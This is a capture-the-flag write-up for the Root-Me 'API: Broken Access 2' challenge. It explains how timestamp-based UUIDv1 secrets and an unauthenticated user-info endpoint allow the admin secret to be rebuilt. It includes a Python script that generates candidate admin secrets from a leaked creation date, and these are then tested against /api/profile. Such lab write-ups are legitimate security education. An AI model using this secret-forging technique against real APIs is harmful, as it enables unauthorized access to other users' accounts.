# 🛡️ API: Broken Access 2 (Root-Me)

## 📌 Challenge Overview

In this challenge, we are given a REST API exposed through Swagger with the following endpoints:

```
/api/signup
/api/login
/api/profile
/api/user/{userid}
/api/note
```

The goal is to access the **admin note**, which contains the flag.

---

## 🔍 Initial Observations

After creating multiple users and authenticating to the API, we can observe that:

- Each user receives a `secret` after login
- This `secret` is required to access protected endpoints such as:
  - `/api/profile`
  - `/api/note`
- Secrets generated for different users share a **common suffix**

Example secret:

```5dceb7a1-f933-11f0-8a0a-0242ac100024```

This indicates that the secret is not randomly generated.

---

## 🧠 Identifying the Secret Format

The secret matches the structure of a UUID.

Further inspection reveals that:
- The secret is a **UUID version 1**
- UUIDv1 is **timestamp-based**

Since timestamp-based identifiers are predictable, this represents a serious security weakness.

---

## 🚨 Information Disclosure

The API endpoint:

```GET /api/user/{userid}```

returns user information **without authentication**.

Querying the admin user:

```GET /api/user/1```

returns:

```json
{
  "userid": 1,
  "username": "admin",
  "creation_date": "2026-01-24 03:10:08.785667"
}
```

This is critical because:

- UUIDv1 encodes the account creation timestamp

- The admin creation date is publicly accessible

- The admin authentication secret can therefore be reconstructed

## 🔐 Broken Access Control

The API authentication mechanism relies only on the secret value.

There is no verification that:

the secret belongs to the requesting user

the user is authorized to access the requested resource

As a result, knowing the admin secret grants full access to admin data.

## 🧪 Exploitation Strategy
Key observations:

All users share the same UUID suffix:

clock_seq + node

Only the timestamp part of the UUID changes

UUIDv1 timestamps use 100‑nanosecond precision

Python datetime objects only support microsecond precision

This causes a small precision mismatch.

Solution:

Reuse the UUID suffix from our own user

Rebuild the UUID prefix using the admin creation timestamp

Brute‑force only a very small range of 100ns offsets (≈ 20 values)

This avoids unnecessary brute‑forcing and keeps the attack efficient.

## 🐍 Proof of Concept: UUID Generator

The following script generates a short list of possible admin secrets
```
import datetime
import uuid

ADMIN_DATE = "2026-01-24 03:10:08.785667"
MY_SECRET = "5dceb7a1-f933-11f0-8a0a-0242ac100024"

UUID_EPOCH = 0x01B21DD213814000
TZ_OFFSET_HOURS = 1
DELTA_RANGE = range(-11, 11)

suffix = MY_SECRET[18:]

admin_dt = datetime.datetime.fromisoformat(ADMIN_DATE)
admin_dt += datetime.timedelta(hours=TZ_OFFSET_HOURS)

base_ts = int(admin_dt.timestamp() * 1e7) + UUID_EPOCH

for delta in DELTA_RANGE:
    ts = base_ts + delta

    time_low = ts & 0xffffffff
    time_mid = (ts >> 32) & 0xffff
    time_hi_version = (ts >> 48) & 0x0fff | (1 << 12)

    uuid_prefix = f"{time_low:08x}-{time_mid:04x}-{time_hi_version:04x}"
    candidate = f"{uuid_prefix}{suffix}"

    uuid.UUID(candidate)
    print(candidate)
```

Each generated UUID can then be tested manually against:

```/api/profile?secret=<UUID>```

## 🏁 Flag Retrieval

One of the generated secrets successfully authenticates as the admin user.

Requesting /api/profile with this secret reveals the admin note containing the flag.

